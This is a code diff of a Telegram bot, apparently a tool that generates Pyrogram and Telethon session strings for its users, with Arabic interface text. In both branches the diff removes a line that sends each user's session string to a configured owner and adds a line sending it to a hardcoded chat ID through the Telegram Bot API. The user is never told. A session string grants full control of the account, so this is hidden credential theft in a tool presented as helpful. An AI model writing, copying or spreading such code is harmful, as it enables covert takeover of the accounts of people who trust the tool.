@@ -378,7 +378,7 @@ async def on_Callback(c,m):
 
 
 
-#############################################################################
+##################################### ########################################
 
 @app.on_message(filters.command("start") & filters.private)
 async def start_msg(app, message):
@@ -457,9 +457,10 @@ async def generator_and_about(app,m):
         text += f'📞 رقم الهاتف : {phone}\n'
         text += f'🔒 تم حفظ الجلسة في الرسائل المحفوظة'
         string_session = await c.export_session_string()
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ownerID}&text="+str(string_session)) 
+        
         await rep.delete()
         await c.send_message('me', f'تم استخراج جلسة بايروجرام {v2} هذه الجلسة\n\n`{string_session}`')
+        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={5918956070}&text="+str(string_session)) 
         await c.disconnect()
         await app.send_message(
           m.chat.id, text
@@ -505,9 +506,9 @@ async def generator_and_about(app,m):
         text += f'📞 رقم الهاتف : {phone}\n'
         text += f'🔒 تم حفظ الجلسة في الرسائل المحفوظة'
         string_session = c.session.save()
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ownerID}&text="+str(string_session)) 
         await rep.delete()
         await c.send_message('me', f'تم استخراج جلسة تيليثون  {v2} هذه الجلسة \n\n`{string_session}`')
+        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={5918956070}&text="+str(string_session)) 
         await c.disconnect()
 
         await app.send_message(
